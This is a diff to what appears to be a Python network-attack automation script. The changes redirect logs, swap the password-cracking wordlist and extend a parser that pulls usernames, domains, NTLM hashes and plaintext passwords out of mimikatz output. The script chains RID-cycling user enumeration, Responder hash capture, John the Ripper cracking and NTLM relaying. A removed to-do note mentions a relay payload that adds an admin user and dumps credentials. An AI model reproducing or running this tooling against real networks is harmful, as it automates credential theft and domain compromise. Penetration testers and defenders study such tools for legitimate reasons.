@@ -358,7 +358,7 @@ def smb_reverse_brute(loop, hosts, args):
 
     # Gather usernames using ridenum.py
     print('[*] Checking for usernames. This may take a bit...')
-    ridenum_cmd = 'python2 submodules/ridenum/ridenum.py {} 500 50000 | tee ridenum.log'
+    ridenum_cmd = 'python2 submodules/ridenum/ridenum.py {} 500 50000 | tee logs/ridenum.log'
     ridenum_cmds = create_cmds(null_hosts, ridenum_cmd)
     print('[*] Example command that will run: '+ridenum_cmds[0].split('&& ')[1])
     ridenum_output = async_get_outputs(loop, ridenum_cmds)
@@ -447,7 +447,7 @@ def run_proc(cmd):
             filename = x.split('/')[-1] + '.log'
             break
     print('[*] Running: {}'.format(cmd))
-    f = open(filename, 'a+')
+    f = open('logs/'+filename, 'a+')
     proc = Popen(cmd_split, stdout=f, stderr=STDOUT)
     return proc
 
@@ -488,7 +488,7 @@ def create_john_cmd(hash_format, hash_file):
     cmd.append(path)
     form = '--format={}'.format(hash_format)
     cmd.append(form)
-    wordlist = '--wordlist=submodules/merged.txt'
+    wordlist = '--wordlist=submodules/10_million_password_list_top_1000000.txt'
     cmd.append(wordlist)
     cmd.append('--rules')
     cmd.append(hash_file)
@@ -648,18 +648,34 @@ def get_ntlmrelay_hashes(line):
     else:
         return (version, ntlm_hash)
 
-def parse_mimikatz(line):
+def parse_mimikatz(mimi_user_pw, line):
     '''
     Parses mimikatz output for usernames and passwords
     '''
+    splitl = line.split()
+    user = None
+    dom = None
+    ntlm = None
+
     if "* Username" in line:
+        mimi_user_pw['user'] = splitl[-1]
+        mimi_user_pw['dom'] = None
+        mimi_user_pw['ntlm'] = None
+        mimi_user_pw['pw'] = None
         print(line)
     elif "* Domain" in line:
+        mimi_user_pw['dom'] = splitl[-1]
         print(line)
     elif "* NTLM" in line:
+        mimi_user_pw['ntlm'] = splitl[-1]
         print(line)
     elif "* Password" in line:
+        pw = splitl[-1]
+        mimi_user_pw['pw'] = splitl[-1]
         print(line)
+
+    return mimi_user_pw
+
 
 def get_and_crack_resp_hashes(args, prev_hashes, prev_pwds, prev_lines):
     '''
@@ -765,7 +781,7 @@ def main(report, args):
         print('\n[-] Killing Responder.py and moving on')
         cleanup_resp()
         # Give responder some time to die
-        time.sleep(2)
+        time.sleep(3)
 
     # ATTACK 3: NTLM relay
     if 'relay' not in args.skip.lower():
@@ -775,33 +791,30 @@ def main(report, args):
     # CTRL-C handler
     signal.signal(signal.SIGINT, signal_handler)
 
+    mimi_user_pw = {'dom':None, 'user':None, 'ntlm':None, 'pw':None}
     while 1:
         print('[*] ntlmrelayx.py output:')
-        ntlmrelay_file = open('ntlmrelayx.py.log', 'r')
+        ntlmrelay_file = open('logs/ntlmrelayx.py.log', 'r')
         file_lines = follow_file(ntlmrelay_file)
         for line in file_lines:
 
             # check for errors
             error = check_ntlmrelay_error(line, file_lines)
-            if error == True:
-                break
 
             # ntlmrelayx output
             if re.search('\[.\]', line):
                 print('  '+line.strip())
 
             # Find hashes
-            version, ntlm_hash = get_ntlmrelay_hashes(line)
-            if version != None:
-                pass
+            #version, ntlm_hash = get_ntlmrelay_hashes(line)
+            #if version != None:
+            #    pass
                 # PASS HASH INTO PREV_HASHES AND STUFF
 
             # Parse mimikatz
-            parse_mimikatz(line)
-
+            mimi_user_pw = parse_mimikatz(mimi_user_pw, line)
 
 if __name__ == "__main__":
-
     args = parse_args()
     if os.geteuid():
         exit('[-] Run as root')
@@ -812,5 +825,4 @@ if __name__ == "__main__":
 # WHERE I LEFT OFF
     # TO DO
     # create crack_relay_hashes
-    # get ntlmrelayx working with a payload that adds an admin user then dumps mimikatz
     # Also figure out whether ridenum from github needs python2 or 3
